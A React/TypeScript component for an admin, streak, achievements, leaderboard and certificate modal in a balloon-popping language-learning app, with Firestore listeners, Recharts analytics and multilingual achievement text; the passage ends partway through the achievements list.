'use client';

import React, { useState, useEffect, useRef, useMemo } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import {
  X,
  Flame,
  ShieldCheck,
  Award,
  Download,
  Upload,
  Users,
  CheckCircle2,
  LogOut,
  Sparkles,
  Trophy,
  Lock,
  Calendar,
  QrCode,
  Globe,
  RefreshCw,
  BarChart3,
  TrendingUp,
  Star,
  Search,
  Plus,
  Minus,
  ChevronUp,
  ChevronDown,
  UserPlus,
  Mic,
  BookOpen,
  GraduationCap,
  MessageCircle,
  AlertTriangle,
  Trash2,
} from 'lucide-react';
import {
  ResponsiveContainer,
  AreaChart,
  Area,
  BarChart,
  Bar,
  XAxis,
  YAxis,
  CartesianGrid,
  Tooltip,
  Legend,
} from 'recharts';
import { jsPDF } from 'jspdf';
import { WORLD_LANGUAGES, LanguageInfo } from '@/lib/languages';
import {
  CertificateLanguageMode,
  getCertificateCopyForLang,
} from '@/lib/certificate-translations';
import { getHubModalTranslations } from '@/lib/hub-modal-translations';
import { getDashboardTranslations } from '@/lib/dashboard-translations';
import {
  getOnboardingWizardCopy,
  OnboardingProfileData,
} from '@/lib/onboarding-translations';
import {
  localizeUsernameForSpokenLanguage,
  getTopicPathUICopy,
} from '@/lib/conversation-topics-90';
import {
  CertTemplateChoice,
  OFFICIAL_CERT_TEMPLATES,
  formatReadableDate,
  buildCertificateSerial,
  renderLocalizedCertificateCanvas,
} from '@/lib/certificate-renderer';
import {
  db,
  auth,
  User,
  LearnerRecord,
  DifficultyLevel,
  BOOTSTRAPPED_ADMIN_EMAIL,
  isUserAdmin,
  signInWithGooglePopup,
  signOutLearner,
  adminUpdateLearnerFields,
  collection,
  doc,
  query,
  orderBy,
  limit,
  onSnapshot,
  getTodayDateString,
  OperationType,
  handleFirestoreError,
} from '@/lib/firebase-client';
import {
  SecurityIncident,
  getSecurityIncidents,
  recordSecurityIncident,
  clearSecurityIncidents,
  markAllSecurityIncidentsRead,
  subscribeToSecurityIncidents,
  inspectAndGuardInput,
} from '@/lib/security-monitor';

interface AdminStreakCertificateModalProps {
  isOpen: boolean;
  initialTab:
    | 'streak_level'
    | 'achievements'
    | 'leaderboard'
    | 'analytics'
    | 'certificate'
    | 'admin';
  onClose: () => void;
  onSignOut?: () => void;
  isDark: boolean;
  currentUser: User | null;
  learnerName: string;
  onChangeLearnerName: (name: string) => void;
  nativeLang: LanguageInfo;
  targetLang: LanguageInfo;
  certLanguageMode: CertificateLanguageMode;
  onChangeCertLanguageMode: (mode: CertificateLanguageMode) => void;
  difficultyLevel: DifficultyLevel;
  onChangeDifficultyLevel: (level: DifficultyLevel) => void;
  easyCompleted: boolean;
  mediumCompleted: boolean;
  courseCompleted: boolean;
  completionDate: string;
  onChangeCompletionDate: (date: string) => void;
  streakDays: number;
  streakGoalDays: number;
  onUpdateStreakConfig: (newStreakDays: number, newGoalDays: number) => void;
  alphabetsCompleted: number;
  alphabetsTotal: number;
  wordsCompleted: number;
  wordsTotal: number;
  conversationsCompleted: number;
  conversationsTotal: number;
  stars: number;
  onChangeStars?: (stars: number) => void;
  adminCommandUnlocked?: boolean;
  adminUnlockedWordsCount?: number;
  onChangeAdminUnlockedWordsCount?: (count: number) => void;
  adminUnlockedTopicsCount?: number;
  onChangeAdminUnlockedTopicsCount?: (count: number) => void;
  onAdminSetWordsCompleted?: (count: number) => void;
  onAdminSetConversationsCompleted?: (
    count: number,
    markAllComplete?: boolean
  ) => void;
  onboardingData?: OnboardingProfileData;
  onTriggerGoalCelebration?: () => void;
  onOpenOnboardingStep?: (
    step: 'native' | 'target' | 'referral' | 'proficiency' | 'daily_goal'
  ) => void;
}

const CUSTOM_CERT_BG_STORAGE_KEY = 'balloony_custom_cert_bg_v1';
const CERT_TEMPLATE_CHOICE_KEY = 'balloony_cert_template_choice_v1';
const ADMIN_OVERRIDES_STORAGE_KEY = 'balloony_admin_overrides_v2';
const ADMIN_CUSTOM_PROFILES_STORAGE_KEY = 'balloony_admin_custom_profiles_v2';

// Only real signed-in learners (and admin-created profiles) appear — no fake placeholder profiles
const DEFAULT_COMMUNITY_PROFILES: LearnerRecord[] = [];

export default function AdminStreakCertificateModal({
  isOpen,
  initialTab,
  onClose,
  onSignOut,
  isDark,
  currentUser,
  learnerName,
  onChangeLearnerName,
  nativeLang,
  targetLang,
  certLanguageMode,
  onChangeCertLanguageMode,
  difficultyLevel,
  onChangeDifficultyLevel,
  easyCompleted,
  mediumCompleted,
  courseCompleted,
  completionDate,
  onChangeCompletionDate,
  streakDays,
  streakGoalDays,
  onUpdateStreakConfig,
  alphabetsCompleted,
  alphabetsTotal,
  wordsCompleted,
  wordsTotal,
  conversationsCompleted,
  conversationsTotal,
  stars,
  onChangeStars,
  adminCommandUnlocked = false,
  adminUnlockedWordsCount = 1,
  onChangeAdminUnlockedWordsCount,
  adminUnlockedTopicsCount = 1,
  onChangeAdminUnlockedTopicsCount,
  onAdminSetWordsCompleted,
  onAdminSetConversationsCompleted,
  onboardingData,
  onTriggerGoalCelebration,
  onOpenOnboardingStep,
}: AdminStreakCertificateModalProps) {
  const obCopy = useMemo(() => getOnboardingWizardCopy(nativeLang), [nativeLang]);
  const isAdminUser = isUserAdmin(currentUser);
  const canOpenAdminPanel = isAdminUser;

  const [activeTab, setActiveTab] = useState<
    | 'streak_level'
    | 'achievements'
    | 'leaderboard'
    | 'analytics'
    | 'certificate'
    | 'admin'
  >(
    initialTab === 'admin' && !canOpenAdminPanel
      ? 'streak_level'
      : initialTab === 'certificate' && !courseCompleted
      ? 'streak_level'
      : initialTab
  );
  const [achievementFilter, setAchievementFilter] = useState<
    'all' | 'unlocked' | 'locked'
  >('all');
  const [claimedAchievementIds, setClaimedAchievementIds] = useState<string[]>(
    []
  );
  const [selectedTemplate, setSelectedTemplate] =
    useState<CertTemplateChoice>('template_1');
  const [customCertBgDataUrl, setCustomCertBgDataUrl] = useState<string | null>(null);
  const [customQrText, setCustomQrText] = useState<string>('');
  const [livePreviewDataUrl, setLivePreviewDataUrl] = useState<string | null>(null);
  const [qrPreviewDataUrl, setQrPreviewDataUrl] = useState<string | null>(null);
  const [qrEncodedPayload, setQrEncodedPayload] = useState<string>('');
  const [isGeneratingPdf, setIsGeneratingPdf] = useState(false);
  const [statusToast, setStatusToast] = useState('');

  // Admin panel & Leaderboard state
  const [learnersList, setLearnersList] = useState<LearnerRecord[]>([]);
  const [topLearnersRaw, setTopLearnersRaw] = useState<LearnerRecord[]>([]);
  const [customAddedProfiles, setCustomAddedProfiles] = useState<LearnerRecord[]>([]);
  const [newStudentNameInput, setNewStudentNameInput] = useState<string>('');
  const [adminSearchQuery, setAdminSearchQuery] = useState<string>('');
  const [loadingLearners, setLoadingLearners] = useState(false);
  const [loadingLeaderboard, setLoadingLeaderboard] = useState(false);
  const [authError, setAuthError] = useState('');
  const [selectedLearnerUid, setSelectedLearnerUid] = useState<string | null>(null);
  const [profileCustomStreak, setProfileCustomStreak] = useState<number>(streakDays);
  const [profileCustomGoal, setProfileCustomGoal] = useState<number>(streakGoalDays);
  const [profileCustomWords, setProfileCustomWords] = useState<number>(wordsCompleted);
  const [profileCustomConversations, setProfileCustomConversations] =
    useState<number>(conversationsCompleted);
  const [customStarsAddInput, setCustomStarsAddInput] = useState<string>('50');
  const [customStarsMinusInput, setCustomStarsMinusInput] = useState<string>('20');
  const [adminLocalOverrides, setAdminLocalOverrides] = useState<
    Record<string, Partial<LearnerRecord>>
  >({});
  const [securityIncidents, setSecurityIncidents] = useState<SecurityIncident[]>(
    () => getSecurityIncidents()
  );
  const fileInputRef = useRef<HTMLInputElement | null>(null);

  useEffect(() => {
    return subscribeToSecurityIncidents((updated) => {
      setSecurityIncidents(updated);
    });
  }, []);

  const unreadSecurityCount = useMemo(
    () => securityIncidents.filter((inc) => !inc.readByAdmin).length,
    [securityIncidents]
  );

  const uiCopy = getCertificateCopyForLang(nativeLang);
  const mt = getHubModalTranslations(nativeLang);

  // Sync activeTab safely when modal opens or initialTab changes: never allow non-admin to view 'admin' or 'analytics'
  useEffect(() => {
    const t = setTimeout(() => {
      if ((initialTab === 'admin' || initialTab === 'analytics') && !canOpenAdminPanel) {
        setActiveTab('streak_level');
      } else if (initialTab === 'analytics' && canOpenAdminPanel) {
        setActiveTab('admin');
      } else if (initialTab === 'certificate' && !courseCompleted) {
        setActiveTab('streak_level');
      } else {
        setActiveTab(initialTab);
      }
    }, 0);
    return () => clearTimeout(t);
  }, [initialTab, canOpenAdminPanel, courseCompleted]);

  // Immediately exit 'admin' or 'analytics' tab if user switches to a non-admin email
  useEffect(() => {
    if (!canOpenAdminPanel && (activeTab === 'admin' || activeTab === 'analytics')) {
      const t = setTimeout(() => setActiveTab('streak_level'), 0);
      return () => clearTimeout(t);
    }
  }, [canOpenAdminPanel, activeTab]);

  useEffect(() => {
    const t = setTimeout(() => {
      try {
        const savedBg = localStorage.getItem(CUSTOM_CERT_BG_STORAGE_KEY);
        if (savedBg) setCustomCertBgDataUrl(savedBg);
        const savedChoice = localStorage.getItem(
          CERT_TEMPLATE_CHOICE_KEY
        ) as CertTemplateChoice | null;
        if (
          savedChoice === 'template_1' ||
          savedChoice === 'template_2' ||
          (savedChoice === 'custom' && savedBg)
        ) {
          setSelectedTemplate(savedChoice);
        }
        const savedOverrides = localStorage.getItem(ADMIN_OVERRIDES_STORAGE_KEY);
        if (savedOverrides) {
          setAdminLocalOverrides(JSON.parse(savedOverrides));
        }
        const savedCustomProfiles = localStorage.getItem(
          ADMIN_CUSTOM_PROFILES_STORAGE_KEY
        );
        if (savedCustomProfiles) {
          setCustomAddedProfiles(JSON.parse(savedCustomProfiles));
        }
        const savedClaimedAch = localStorage.getItem(
          'balloony_claimed_achievements_v1'
        );
        if (savedClaimedAch) {
          setClaimedAchievementIds(JSON.parse(savedClaimedAch));
        }
      } catch {}
    }, 0);
    return () => clearTimeout(t);
  }, []);

  // Real-time Firestore listener for Admin Panel & Progress Analytics Tab
  useEffect(() => {
    if (!isOpen || (activeTab !== 'admin' && activeTab !== 'analytics')) {
      return;
    }
    const fbUser = auth.currentUser;
    if (!fbUser || !fbUser.emailVerified) {
      return;
    }

    if (isUserAdmin(fbUser)) {
      const initTimer = setTimeout(() => {
        setLoadingLearners(true);
      }, 0);
      const learnersPath = 'learners';
      const q = query(
        collection(db, learnersPath),
        orderBy('updatedAt', 'desc'),
        limit(100)
      );

      const unsubscribe = onSnapshot(
        q,
        (snapshot) => {
          const rows: LearnerRecord[] = [];
          snapshot.forEach((docSnap) => {
            rows.push(docSnap.data() as LearnerRecord);
          });
          setLearnersList(rows);
          setLoadingLearners(false);
        },
        (error) => {
          setLoadingLearners(false);
          try {
            handleFirestoreError(error, OperationType.LIST, learnersPath);
          } catch {}
        }
      );

      return () => {
        clearTimeout(initTimer);
        unsubscribe();
      };
    }

    const initTimer = setTimeout(() => {
      setLoadingLearners(true);
    }, 0);
    const docPath = `learners/${fbUser.uid}`;
    const docRef = doc(db, 'learners', fbUser.uid);

    const unsubscribe = onSnapshot(
      docRef,
      (docSnap) => {
        if (docSnap.exists()) {
          setLearnersList([docSnap.data() as LearnerRecord]);
        } else {
          setLearnersList([]);
        }
        setLoadingLearners(false);
      },
      (error) => {
        setLoadingLearners(false);
        try {
          handleFirestoreError(error, OperationType.GET, docPath);
        } catch {}
      }
    );

    return () => {
      clearTimeout(initTimer);
      unsubscribe();
    };
  }, [isOpen, activeTab, isAdminUser, currentUser]);

  // Dedicated Firestore listener for 'Top Learners' Leaderboard Tab (fetching top 10 profiles by stars)
  useEffect(() => {
    if (!isOpen || activeTab !== 'leaderboard') {
      return;
    }
    const fbUser = auth.currentUser;
    if (!fbUser || !fbUser.emailVerified) {
      return;
    }

    if (isUserAdmin(fbUser)) {
      const initTimer = setTimeout(() => {
        setLoadingLeaderboard(true);
      }, 0);
      const learnersPath = 'learners';
      const topStarsQuery = query(
        collection(db, learnersPath),
        orderBy('stars', 'desc'),
        limit(10)
      );

      const unsubscribe = onSnapshot(
        topStarsQuery,
        (snapshot) => {
          const rows: LearnerRecord[] = [];
          snapshot.forEach((docSnap) => {
            rows.push(docSnap.data() as LearnerRecord);
          });
          setTopLearnersRaw(rows);
          setLoadingLeaderboard(false);
        },
        (error) => {
          setLoadingLeaderboard(false);
          try {
            handleFirestoreError(error, OperationType.LIST, learnersPath);
          } catch {}
        }
      );

      return () => {
        clearTimeout(initTimer);
        unsubscribe();
      };
    }

    const initTimer = setTimeout(() => {
      setLoadingLeaderboard(true);
    }, 0);
    const docPath = `learners/${fbUser.uid}`;
    const docRef = doc(db, 'learners', fbUser.uid);

    const unsubscribe = onSnapshot(
      docRef,
      (docSnap) => {
        if (docSnap.exists()) {
          setTopLearnersRaw([docSnap.data() as LearnerRecord]);
        } else {
          setTopLearnersRaw([]);
        }
        setLoadingLeaderboard(false);
      },
      (error) => {
        setLoadingLeaderboard(false);
        try {
          handleFirestoreError(error, OperationType.GET, docPath);
        } catch {}
      }
    );

    return () => {
      clearTimeout(initTimer);
      unsubscribe();
    };
  }, [isOpen, activeTab, isAdminUser, currentUser]);

  // Build effective dataset from Firestore records + current user + community profiles so all learners' profiles are always visible & editable
  const effectiveLearnersForCharts = useMemo<LearnerRecord[]>(() => {
    const localUid = currentUser?.uid || 'local_learner';
    const rawUserName =
      learnerName.trim() || currentUser?.displayName || mt.currentUserDefaultName;
    const localizedUserName = localizeUsernameForSpokenLanguage(
      rawUserName,
      nativeLang,
      mt.currentUserDefaultName
    );
    const localRecord: LearnerRecord = {
      uid: localUid,
      displayName: localizedUserName,
      nativeLangCode: nativeLang.code,
      nativeLangName: nativeLang.name,
      targetLangCode: targetLang.code,
      targetLangName: targetLang.name,
      difficultyLevel,
      currentStage: courseCompleted
        ? 'COMPLETED'
        : mediumCompleted
        ? 'CONVERSATION_GAME'
        : easyCompleted
        ? 'WORDS_GAME'
        : 'ALPHABET_GAME',
      alphabetsCompleted,
      alphabetsTotal,
      wordsCompleted,
      wordsTotal,
      conversationsCompleted,
      conversationsTotal,
      stars,
      streakDays,
      streakGoalDays,
      lastActiveDate: getTodayDateString(),
      certificateEarned: courseCompleted,
    };

    const mergedMap = new Map<string, LearnerRecord>();
    mergedMap.set(localRecord.uid, localRecord);

    learnersList.forEach((rec) => {
      const isMe = currentUser && rec.uid === currentUser.uid;
      mergedMap.set(rec.uid, {
        ...rec,
        ...(isMe
          ? {
              streakDays: Math.max(localRecord.streakDays, rec.streakDays || 0),
              streakGoalDays: Math.max(
                localRecord.streakGoalDays,
                rec.streakGoalDays || 7
              ),
              stars: localRecord.stars,
              wordsCompleted: localRecord.wordsCompleted,
              conversationsCompleted: localRecord.conversationsCompleted,
            }
          : {}),
        displayName: localizeUsernameForSpokenLanguage(
          isMe && learnerName.trim() ? learnerName.trim() : rec.displayName,
          nativeLang,
          mt.currentUserDefaultName
        ),
      });
    });

    customAddedProfiles.forEach((rec) => {
      if (!mergedMap.has(rec.uid)) {
        mergedMap.set(rec.uid, {
          ...rec,
          displayName: localizeUsernameForSpokenLanguage(
            rec.displayName,
            nativeLang,
            rec.displayName
          ),
        });
      }
    });

    DEFAULT_COMMUNITY_PROFILES.forEach((rec) => {
      if (!mergedMap.has(rec.uid)) {
        mergedMap.set(rec.uid, rec);
      }
    });

    return Array.from(mergedMap.values()).map((rec) => {
      const override = adminLocalOverrides[rec.uid];
      if (!override) return rec;
      if (rec.uid === localRecord.uid) {
        return {
          ...rec,
          ...override,
          streakDays: localRecord.streakDays,
          streakGoalDays: localRecord.streakGoalDays,
          stars: localRecord.stars,
          wordsCompleted: localRecord.wordsCompleted,
          conversationsCompleted: localRecord.conversationsCompleted,
        };
      }
      return { ...rec, ...override };
    });
  }, [
    learnersList,
    customAddedProfiles,
    adminLocalOverrides,
    currentUser,
    nativeLang,
    learnerName,
    mt.currentUserDefaultName,
    nativeLang.code,
    nativeLang.name,
    targetLang.code,
    targetLang.name,
    difficultyLevel,
    courseCompleted,
    mediumCompleted,
    easyCompleted,
    alphabetsCompleted,
    alphabetsTotal,
    wordsCompleted,
    wordsTotal,
    conversationsCompleted,
    conversationsTotal,
    stars,
    streakDays,
    streakGoalDays,
  ]);

  const filteredAdminLearners = useMemo<LearnerRecord[]>(() => {
    const q = adminSearchQuery.trim().toLowerCase();
    if (!q) return effectiveLearnersForCharts;
    return effectiveLearnersForCharts.filter(
      (rec) =>
        rec.displayName.toLowerCase().includes(q) ||
        rec.nativeLangName.toLowerCase().includes(q) ||
        rec.targetLangName.toLowerCase().includes(q) ||
        rec.uid.toLowerCase().includes(q)
    );
  }, [effectiveLearnersForCharts, adminSearchQuery]);

  const selectedLearnerRecord = useMemo<LearnerRecord | null>(() => {
    if (selectedLearnerUid) {
      const found = effectiveLearnersForCharts.find(
        (r) => r.uid === selectedLearnerUid
      );
      if (found) return found;
    }
    return filteredAdminLearners[0] || effectiveLearnersForCharts[0] || null;
  }, [selectedLearnerUid, filteredAdminLearners, effectiveLearnersForCharts]);

  const handleSelectLearnerProfile = (rec: LearnerRecord) => {
    setSelectedLearnerUid(rec.uid);
    setProfileCustomStreak(rec.streakDays);
    setProfileCustomGoal(rec.streakGoalDays);
    setProfileCustomWords(rec.wordsCompleted);
    setProfileCustomConversations(rec.conversationsCompleted);
  };

  const handleAddNewStudentProfile = () => {
    const cleanName = newStudentNameInput.trim();
    if (!cleanName) return;
    const newUid = `custom_learner_${cleanName.replace(/\s+/g, '_').toLowerCase()}_${customAddedProfiles.length + 1}`;
    const newRec: LearnerRecord = {
      uid: newUid,
      displayName: cleanName,
      nativeLangCode: nativeLang.code,
      nativeLangName: nativeLang.name,
      targetLangCode: targetLang.code,
      targetLangName: targetLang.name,
      difficultyLevel: 'easy',
      currentStage: 'ALPHABET_GAME',
      alphabetsCompleted: 1,
      alphabetsTotal: Math.max(1, alphabetsTotal),
      wordsCompleted: 0,
      wordsTotal: Math.max(1, wordsTotal),
      conversationsCompleted: 0,
      conversationsTotal: Math.max(1, conversationsTotal),
      stars: 10,
      streakDays: 1,
      streakGoalDays: 7,
      lastActiveDate: getTodayDateString(),
      certificateEarned: false,
    };
    const nextList = [newRec, ...customAddedProfiles];
    setCustomAddedProfiles(nextList);
    try {
      localStorage.setItem(
        ADMIN_CUSTOM_PROFILES_STORAGE_KEY,
        JSON.stringify(nextList)
      );
    } catch {}
    setNewStudentNameInput('');
    setSelectedLearnerUid(newUid);
    setProfileCustomStreak(1);
    setProfileCustomGoal(7);
    showTempToast(mt.profileAddedToast(cleanName));
  };

  const handleAdminBoostLearner = async (
    targetRec: LearnerRecord,
    updates: Partial<
      Pick<
        LearnerRecord,
        | 'displayName'
        | 'streakDays'
        | 'streakGoalDays'
        | 'difficultyLevel'
        | 'currentStage'
        | 'stars'
        | 'alphabetsCompleted'
        | 'wordsCompleted'
        | 'conversationsCompleted'
        | 'certificateEarned'
      >
    >,
    toastMessage: string
  ) => {
    // 1. Optimistic UI override + localStorage persistence so changes persist across refreshes
    setAdminLocalOverrides((prev) => {
      const next = {
        ...prev,
        [targetRec.uid]: {
          ...(prev[targetRec.uid] || {}),
          ...updates,
        },
      };
      try {
        localStorage.setItem(ADMIN_OVERRIDES_STORAGE_KEY, JSON.stringify(next));
      } catch {}
      return next;
    });

    if (typeof updates.streakDays === 'number') {
      setProfileCustomStreak(updates.streakDays);
    }
    if (typeof updates.streakGoalDays === 'number') {
      setProfileCustomGoal(updates.streakGoalDays);
    }
    if (typeof updates.wordsCompleted === 'number') {
      setProfileCustomWords(updates.wordsCompleted);
    }
    if (typeof updates.conversationsCompleted === 'number') {
      setProfileCustomConversations(updates.conversationsCompleted);
    }

    // 2. If targetRec is the current device learner, also sync to live game state
    const isCurrentDeviceLearner =
      targetRec.uid === 'local_learner' ||
      (currentUser && targetRec.uid === currentUser.uid);

    if (isCurrentDeviceLearner) {
      if (
        typeof updates.streakDays === 'number' ||
        typeof updates.streakGoalDays === 'number'
      ) {
        onUpdateStreakConfig(
          typeof updates.streakDays === 'number'
            ? updates.streakDays
            : targetRec.streakDays,
          typeof updates.streakGoalDays === 'number'
            ? updates.streakGoalDays
            : targetRec.streakGoalDays
        );
      }
      if (updates.difficultyLevel) {
        onChangeDifficultyLevel(updates.difficultyLevel);
      }
      if (typeof updates.stars === 'number' && onChangeStars) {
        onChangeStars(updates.stars);
      }
      if (
        typeof updates.wordsCompleted === 'number' &&
        onAdminSetWordsCompleted
      ) {
        onAdminSetWordsCompleted(updates.wordsCompleted);
      }
      if (
        typeof updates.conversationsCompleted === 'number' &&
        onAdminSetConversationsCompleted
      ) {
        const isMarkingAllComplete =
          updates.currentStage === 'COMPLETED' ||
          Boolean(updates.certificateEarned) ||
          updates.conversationsCompleted >= Math.max(1, targetRec.conversationsTotal);
        onAdminSetConversationsCompleted(
          updates.conversationsCompleted,
          isMarkingAllComplete
        );
      } else if (
        (updates.currentStage === 'COMPLETED' || updates.certificateEarned) &&
        onAdminSetConversationsCompleted
      ) {
        if (onAdminSetWordsCompleted) {
          onAdminSetWordsCompleted(Math.max(1, targetRec.wordsTotal));
        }
        onAdminSetConversationsCompleted(
          Math.max(1, targetRec.conversationsTotal),
          true
        );
      }
    }

    // 3. Persist to Firestore if this learner exists in Firestore learnersList and admin is signed in
    const existsInFirestore = learnersList.some((r) => r.uid === targetRec.uid);
    if (existsInFirestore && currentUser?.emailVerified) {
      try {
        await adminUpdateLearnerFields(targetRec.uid, targetRec, updates);
      } catch (err) {
        console.error('Admin update error:', err);
      }
    }

    showTempToast(toastMessage);
  };

  // Step a learner's Level UP (+1) or DOWN (-1) across the 4 stages:
  // Level 1: Easy (Alphabet) <-> Level 2: Medium (Words) <-> Level 3: Hard (Conversation) <-> Level 4: Completed
  const getLearnerNumericLevel = (rec: LearnerRecord): number => {
    if (rec.currentStage === 'COMPLETED' || rec.certificateEarned) return 4;
    if (rec.difficultyLevel === 'hard') return 3;
    if (rec.difficultyLevel === 'medium') return 2;
    return 1;
  };

  const handleStepLearnerLevel = (
    item: LearnerRecord,
    direction: 'up' | 'down'
  ) => {
    const currentNum = getLearnerNumericLevel(item);
    const nextNum =
      direction === 'up'
        ? Math.min(4, currentNum + 1)
        : Math.max(1, currentNum - 1);

    if (nextNum === 1) {
      handleAdminBoostLearner(
        item,
        {
          difficultyLevel: 'easy',
          currentStage: 'ALPHABET_GAME',
          certificateEarned: false,
        },
        `⬇️ ${item.displayName}: ${mt.levelShortLabel(1)} (${mt.stageSub1})`
      );
    } else if (nextNum === 2) {
      handleAdminBoostLearner(
        item,
        {
          difficultyLevel: 'medium',
          currentStage: 'WORDS_GAME',
          certificateEarned: false,
        },
        `${direction === 'up' ? '⬆️' : '⬇️'} ${item.displayName}: ${mt.levelShortLabel(2)} (${mt.stageSub2})`
      );
    } else if (nextNum === 3) {
      handleAdminBoostLearner(
        item,
        {
          difficultyLevel: 'hard',
          currentStage: 'CONVERSATION_GAME',
          certificateEarned: false,
        },
        `${direction === 'up' ? '⬆️' : '⬇️'} ${item.displayName}: ${mt.levelShortLabel(3)} (${mt.stageSub3})`
      );
    } else {
      handleAdminBoostLearner(
        item,
        {
          difficultyLevel: 'hard',
          currentStage: 'COMPLETED',
          certificateEarned: true,
        },
        `🎓 ${item.displayName}: ${mt.levelShortLabel(4)} (${mt.stageSub4})`
      );
    }
  };

  // Top 10 Learners sorted by stars descending (from Firestore topLearnersRaw + effectiveLearnersForCharts)
  const topTenLearners = useMemo<LearnerRecord[]>(() => {
    const mergedMap = new Map<string, LearnerRecord>();

    effectiveLearnersForCharts.forEach((rec) => {
      mergedMap.set(rec.uid, rec);
    });

    topLearnersRaw.forEach((rec) => {
      const override = adminLocalOverrides[rec.uid];
      mergedMap.set(rec.uid, override ? { ...rec, ...override } : rec);
    });

    return Array.from(mergedMap.values())
      .sort((a, b) => {
        const starDiff = Number(b.stars || 0) - Number(a.stars || 0);
        if (starDiff !== 0) return starDiff;
        return Number(b.streakDays || 0) - Number(a.streakDays || 0);
      })
      .slice(0, 10);
  }, [effectiveLearnersForCharts, topLearnersRaw, adminLocalOverrides]);

  // Time-series data for Recharts AreaChart: Active Users & Total Stars Earned Over Last 7 Days
  const timeSeriesChartData = useMemo(() => {
    const daysMap = new Map<
      string,
      { date: string; label: string; activeUsers: number; totalStars: number; totalPopped: number }
    >();

    const anchorIso =
      /^[0-9]{4}-[0-9]{2}-[0-9]{2}$/.test(completionDate)
        ? completionDate
        : '2026-11-10';
    const anchorMs = new Date(`${anchorIso}T12:00:00Z`).getTime();

    // Seed last 7 calendar days so the time-series axis is always smooth and chronological
    for (let i = 6; i >= 0; i--) {
      const d = new Date(anchorMs - i * 86400000);
      const y = d.getUTCFullYear();
      const m = String(d.getUTCMonth() + 1).padStart(2, '0');
      const day = String(d.getUTCDate()).padStart(2, '0');
      const iso = `${y}-${m}-${day}`;
      const shortLabel = `${m}/${day}`;
      daysMap.set(iso, {
        date: iso,
        label: shortLabel,
        activeUsers: 0,
        totalStars: 0,
        totalPopped: 0,
      });
    }

    effectiveLearnersForCharts.forEach((rec) => {
      const dateKey = rec.lastActiveDate || anchorIso;
      const shortLabel = dateKey.slice(5).replace('-', '/');
      const existing = daysMap.get(dateKey) || {
        date: dateKey,
        label: shortLabel,
        activeUsers: 0,
        totalStars: 0,
        totalPopped: 0,
      };
      existing.activeUsers += 1;
      existing.totalStars += Number(rec.stars || 0);
      existing.totalPopped +=
        Number(rec.alphabetsCompleted || 0) +
        Number(rec.wordsCompleted || 0) +
        Number(rec.conversationsCompleted || 0);
      daysMap.set(dateKey, existing);
    });

    return Array.from(daysMap.values()).sort((a, b) => a.date.localeCompare(b.date));
  }, [completionDate, effectiveLearnersForCharts]);

  // Per-Learner Stage & Stars Breakdown for Recharts BarChart
  const learnerStageBarData = useMemo(() => {
    return effectiveLearnersForCharts.slice(0, 8).map((rec) => ({
      name:
        rec.displayName.length > 12
          ? `${rec.displayName.slice(0, 12)}…`
          : rec.displayName,
      alphabets: Number(rec.alphabetsCompleted || 0),
      words: Number(rec.wordsCompleted || 0),
      conversations: Number(rec.conversationsCompleted || 0),
      stars: Number(rec.stars || 0),
      streak: Number(rec.streakDays || 0),
    }));
  }, [effectiveLearnersForCharts]);

  const analyticsSummary = useMemo(() => {
    const totalUsers = effectiveLearnersForCharts.length;
    const totalStarsAll = effectiveLearnersForCharts.reduce(
      (acc, r) => acc + Number(r.stars || 0),
      0
    );
    const totalPoppedAll = effectiveLearnersForCharts.reduce(
      (acc, r) =>
        acc +
        Number(r.alphabetsCompleted || 0) +
        Number(r.wordsCompleted || 0) +
        Number(r.conversationsCompleted || 0),
      0
    );
    const avgStreak =
      totalUsers > 0
        ? Math.round(
            effectiveLearnersForCharts.reduce(
              (acc, r) => acc + Number(r.streakDays || 0),
              0
            ) / totalUsers
          )
        : 0;
    return { totalUsers, totalStarsAll, totalPoppedAll, avgStreak };
  }, [effectiveLearnersForCharts]);

  const showTempToast = (msg: string) => {
    setStatusToast(msg);
    setTimeout(() => setStatusToast(''), 3200);
  };

  // Total balloons popped & words mastered for Achievements milestones
  const totalBalloonsPoppedUser = useMemo(() => {
    const directPopped =
      Number(alphabetsCompleted || 0) +
      Number(wordsCompleted || 0) +
      Number(conversationsCompleted || 0);
    // Also factor in stars earned from popping balloons in practice sessions (10 stars per pop)
    const starDerivedPops = Math.floor(Number(stars || 0) / 10);
    return Math.max(directPopped, starDerivedPops);
  }, [alphabetsCompleted, wordsCompleted, conversationsCompleted, stars]);

  const effectiveWordsMasteredUser = useMemo(() => {
    const directWords = Number(wordsCompleted || 0);
    const convVocabBonus = Number(conversationsCompleted || 0);
    return directWords + convVocabBonus;
  }, [wordsCompleted, conversationsCompleted]);

  const achievementsList = useMemo(() => {
    const code = nativeLang.code;
    const isUr = code === 'ur';
    const isFa = code === 'fa';
    const isFr = code === 'fr';
    const isHi = code === 'hi';
    const isAr = code === 'ar';

    return [
      {
        id: 'words_10',
        icon: '📘',
        emblemKind: 'words' as const,
        emblemGradient: 'from-emerald-400 via-teal-500 to-cyan-600',
        tierLabel: isUr
          ? 'بنیادی سنگِ میل'
          : isHi
          ? 'प्रारंभिक उपलब्धि'
          : isAr
          ? 'وسام الأساس'
          : 'Core Milestone',
        badgeTitle: '10 Words Mastered',
        localizedTitle: isFa
          ? 'تسلط بر ۱۰ واژه'
          : isFr
          ? '10 Mots Maîtrisés'
          : isUr
          ? '10 الفاظ میں مہارت'
          : isHi
          ? '10 शब्दों में महारत'
          : isAr
          ? 'إتقان 10 كلمات'
          : '10 Words Mastered',
        description: isFa
          ? '۱۰ واژه اول خود را با تلفظ صحیح و واضح یاد بگیرید و بترکانید.'
          : isFr
          ? 'Maîtrisez vos 10 premiers mots de vocabulaire avec une prononciation claire.'
          : isUr
          ? 'درست تلفظ کے ساتھ اپنے پہلے 10 الفاظ کامیابی سے سیکھیں اور غبارے پاپ کریں۔'
          : isHi
          ? 'सही उच्चारण के साथ अपने पहले 10 शब्द सफलतापूर्वक सीखें।'
          : isAr
          ? 'أتقن أول 10 كلمات بنطق واضح وصحيح.'
          : 'Master your first 10 vocabulary words with accurate voice pronunciation.',
        current: Math.min(10, effectiveWordsMasteredUser),
        target: 10,
        unit: isFa ? 'واژه' : isFr ? 'mots' : isUr ? 'الفاظ' : isHi ? 'शब्द' : isAr ? 'كلمات' : 'words',
        unlocked: effectiveWordsMasteredUser >= 10 || wordsCompleted >= 10,
        rewardStars: 20,
      },
      {
        id: 'streak_5',
        icon: '🔥',
        emblemKind: 'streak' as const,
        emblemGradient: 'from-amber-400 via-orange-500 to-rose-600',
        tierLabel: isUr
          ? 'اسٹریک میڈل'
          : isHi
          ? 'स्ट्रीक मेडल'
          : isAr
          ? 'وسام الاستمرارية'
          : 'Streak Medallion',
